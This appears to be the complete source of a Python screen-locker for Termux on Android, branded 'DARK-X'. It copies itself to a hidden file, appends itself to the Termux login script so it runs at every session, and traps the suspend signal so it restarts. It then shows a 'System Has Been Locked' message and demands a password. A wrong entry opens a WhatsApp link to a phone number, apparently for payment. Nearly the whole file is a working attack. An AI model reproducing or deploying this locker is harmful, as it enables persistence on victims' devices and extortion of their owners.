import os, time, sys, signal, colorama
from colorama import Fore,Back,Style
colorama.init()
def handle(signal_num,frame):
	os.execl(sys.executable, sys.executable, *sys.argv)
def animasi(text):
	for i in text:
		sys.stdout.write(i)
		sys.stdout.flush()
		time.sleep(0.05)
def logo():
    print("""
 \033[1;34m██████\033[1;31m╗    \033[1;34m█████\033[1;31m╗   \033[1;34m██████\033[1;31m╗   \033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╗           \033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╗
 \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m║ \033[1;34m██\033[1;31m╔╝           ╚\033[1;34m██\033[1;31m╗\033[1;34m██\033[1;31m╔╝
 \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m███████\033[1;31m║  \033[1;34m██████\033[1;31m╔╝  \033[1;34m█████\033[1;31m╔╝   \033[1;34m███████\033[1;31m╗  ╚\033[1;34m███\033[1;31m╔╝
 \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╔══\033[1;34m██\033[1;31m╗  \033[1;34m██\033[1;31m╔═\033[1;34m██\033[1;31m╗   ╚══════╝  \033[1;34m██\033[1;31m╔\033[1;34m██\033[1;31m╗
 \033[1;34m██████\033[1;31m╔╝  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m║  \033[1;34m██\033[1;31m╗           \033[1;34m██\033[1;31m╔╝ \033[1;34m██\033[1;31m╗
 \033[1;31m╚═════╝   ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝           ╚═╝  ╚═╝""")
def logo2():
    animasi("""
 Your System Has Been Locked By Nick777x\n
""")
try:
	os.system("cp deface.py /data/data/com.termux/files/usr/lib/.t")
	# os.system("cp /data/data/com.termux/files/usr/etc/bash.bashrc /data/data/com.termux/files/usr/etc/hacked.bashrc")
	with open("/data/data/com.termux/files/usr/etc/termux-login.sh","r") as fileutama:
		contentutama = fileutama.read()
	with open("/data/data/com.termux/files/usr/etc/termux-login.sh","a") as filekedua:
		if "python3 /data/data/com.termux/files/usr/lib/.t" in contentutama:
			pass
		else:
			filekedua.write("python3 /data/data/com.termux/files/usr/lib/.t")
	def utama2():
		os.system("login")
	def utama():
		signal.signal(signal.SIGTSTP,handle)
		os.system("clear")
		logo()
		logo2()	
		pasw = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPassword \033[1;31m: \033[0;37m")
		print("")
		if pasw == "111":
			bayarnya = "/data/data/com.termux/files/usr/etc/termux-login.sh"
			codenya = "python3 /data/data/com.termux/files/usr/lib/.t"
			bypassnya = ""
			with open(bayarnya,"r") as libas1:
				lines = libas1.readlines()
			with open(bayarnya,"w") as libas2:
				for line in lines:
					if codenya not in line:
						libas2.write(line)
			with open(bayarnya,"a") as libas3:
				libas3.write(bypassnya)
			os.system("rm /data/data/com.termux/files/usr/lib/.t")
		else:
			os.system("xdg-open https://wa.me/+6283141494320")
			os.system("login")

	utama()
except KeyboardInterrupt:
	utama2()
       
